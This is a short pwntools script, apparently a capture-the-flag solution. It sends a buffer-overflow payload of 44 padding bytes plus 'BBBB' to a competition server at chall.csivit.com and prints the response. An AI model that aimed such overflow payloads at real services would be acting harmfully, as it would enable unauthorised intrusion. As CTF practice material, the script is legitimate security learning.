from pwn import *
payload = 'A'*44+'BBBB'
p = remote('chall.csivit.com', 30001)
print p.recv()
p.sendline(payload)
print p.recvall()
